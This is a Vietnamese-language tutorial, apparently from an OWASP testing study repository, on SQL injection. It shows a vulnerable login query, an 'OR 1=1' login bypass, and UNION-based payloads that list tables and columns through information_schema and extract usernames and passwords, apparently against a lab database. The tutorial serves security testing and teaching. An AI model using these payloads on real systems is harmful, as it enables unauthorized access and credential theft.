# Description
- SQL injection là một kỹ thuật cho phép những kẻ tấn công lợi dụng lỗ hổng của việc kiểm tra dữ liệu đầu vào trong các ứng dụng web và các thông báo lỗi của hệ quản trị cơ sở dữ liệu trả về để dữ liệu và thi hành các câu lệnh SQL bất hợp pháp.  
- Tấn công có thể đọc dữ liệu nhạy cảm từ cơ sở dữ liệu, sửa đổi dữ liệu cơ sở dữ liệu (chèn / cập nhật / xóa), thực thi các thao tác quản trị trên cơ sở dữ liệu.  

![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-1.png)  

### Ví dụ minh họa
```sql
$query = "SELECT * FROM users WHERE uname = '" + $userName + "' AND password='"+$password+"';";
```
- Câu lệnh này được thiết kế để kiểm tra đăng nhập hoặc thông tin người dùng cụ thể từ bảng những người dùng.
- Tuy nhiên, nếu biến "userName" được nhập chính xác theo một cách nào đó bởi người dùng ác ý, nó có thể trở thành một câu truy vấn SQL với mục đích khác hẳn so với mong muốn của tác giả đoạn mã trên.
- Ví dụ, ta nhập vào giá trị của biến userName như sau: 
```sql
admin' OR 1=1#
```
- Câu truy vấn trở thành:
```sql
SELECT * FROM users WHERE uname = 'admin' OR 1=1 # AND password='';
```
- Câu truy vấn trên sẽ lấy dữ liệu của admin. Điều này vô cùng nguy hiểm!!!
### Có năm kỹ thuật chung để khai thác SQL. Ngoài ra, các kỹ thuật này đôi khi có thể được sử dụng theo cách kết hợp :
- Union query based
- Boolean base
- Error based
- Out-of-band
- Time based
# How to test
#### 1. Phát hiện
- Thêm vào câu truy vấn các meta character trong các hệ quản trị cơ sở dữ liệu, chẳng hạn như dấu nháy đơn (single quote), dấu nháy kép (double quote), dấu chấm phẩy (semi colon) và các ký tự comment (--, ##, /**/)…

![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-2.png)  



#### 2. Thu thập thông tin về hệ quản trị cơ sở dữ liệu
- Khi phát hiện ứng dụng bị dính lỗi SQL injection, công việc cần làm tiếp theo là thu thập thông tin về hệ quản trị cơ sở dữ liệu mà ứng dụng đang dùng, thông tin này bao gồm loại cơ sở dữ liệu (mysql, mssql, oracle…) và phiên bản của nó.

![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-3.png)  

#### 3. Xác định số lượng cột trong mệnh đề select
- Ta có thể sử dụng mệnh đề ```order by``` hoặc dùng ```UNION SELECT```  

![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-4.png)  

- Kết quả trả về lỗi do số lượng cột của 2 mệnh đề select khác nhau. Tăng thêm số lượng cột :

![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-5.png)  

#### 4. Xác định thông tin
- Sau khi lấy được các thông tin cơ bản, chúng ta sẽ tiến hành khai thác SQL injection để lấy cơ sở dữ liệu hay thực hiện những hành vi khác thông qua lỗ hổng này.
- Ở đây chúng ta sử dụng kĩ thuật UNION BASED.

![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-6.png)  

- Tiếp tục, lấy tên các bảng trong cơ sở dữ liệu bằng cách sử dụng database information_schema:
```sql
1' union select 1,CONCAT(TABLE_NAME),3 FROM information_schema.TABLES where TABLE_SCHEMA='leettime_761wHole'-- -
```

![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-7.png)  

- Lấy tên cột:

```sql
-1' union select 1,CONCAT(COLUMN_NAME),3 FROM information_schema.COLUMNS where TABLE_NAME='users'-- -
```

![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-8.png)  

- Lấy dữ liệu từ bảng:
```sql
-1' union select 1,CONCAT(username,'+',password,'-'),3 FROM users-- -
```

![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/005-9.png) 

